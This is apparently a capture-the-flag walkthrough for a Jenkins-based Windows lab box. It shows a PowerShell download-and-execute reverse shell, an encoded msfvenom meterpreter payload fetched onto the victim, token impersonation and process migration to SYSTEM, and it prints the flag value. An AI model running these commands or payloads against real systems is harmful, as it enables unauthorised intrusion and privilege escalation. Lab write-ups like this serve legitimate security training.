        Task 1

- Run an nmap scan on the $IP

- We see that port 8080 is being used, so in the web browser,
  pull up $IP:8080
- We see a login page. Go ahead and google the default password for
  Jenkins to see if that works. Default is admin:password, in this
  case it's admin:admin
- Once in, take a look at the files in use. We've got a "project."
  Go into there and go to the configure page to check it out.
- We've been given the hint that we should run a reverse shell attack
  with a specific path outlined:

powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

  Edit this to fit the IP addresses and ports needed.
  Go to the directory that has Invoke-PowerShellTcp.ps1 in it
  Spin up a python server:

sudo python3 -m http.server 80

  sets up a python server on port 80

  Also set up a netcat listener

nv -nvlp 9001

  Build on the Alfred website and you should see your listener pick up
  a shell. Your Python server will also show the "GET".

  Now you'll have a shell, find the user.txt in the /bruce/Desktop directory

        Task 2

- You'll be using Metasploit to nail this next part.
  Generate a payload and name it whatever you want

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.5.178 LPORT=9002 -f exe -o gotcha.exe

  It will include setting up a listener on port 9002 so keep that in mind.

- Set up another python3 server in the alfred folder where you downloaded
  your payload_name.exe

- run

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.5.178:8000/gotcha.exe','gotcha.exe')"

  on the victim machine. It will download the payload.exe from your system.

- Next set up msfconsole:

msfconsole
msf5 > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 > set LHOST tun0
LHOST => tun0
msf5 > set LPORT 9002
LPORT => 9002
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > run

- This configures the environment to be able to receive the payload once it's
  run on the victim machine
- On victim, Start-Process "gotcha.exe"
- Metasploit intercepts this. Once in msfconsole intercepting, type

/shell

  to operate with windows commands.

whoami /priv

  To see what privileges we have as this user. Let's go ahead and
  load incognito mode on metasploit.

exit
load incognito

list_tokens -g

  This shows us a list of the tokens that we can impersonate. We are
  looking for something with admin privileges. In this case,
  BUILTIN\Administrators is available

impersonate_token "BUILTIN\Administrators"

  Let it load

getuid

  Next find a system process to migrate to with the correct permissions to
  stabilize the shell and ensure permissions of a privileged user.
  You can use services.exe here, PID 668. Try also with spoolsv.exe PID 1224

  Next:

migrate 1224

shell
whoami

  Result:

nt authority\system

- Next locate the root.txt file

dir root.txt /s

Directory of C:\Windows\system32\config

- cd into that directory and type the file

type root.txt

  Result:

dff0f748678f280250f25a45b8046b4a
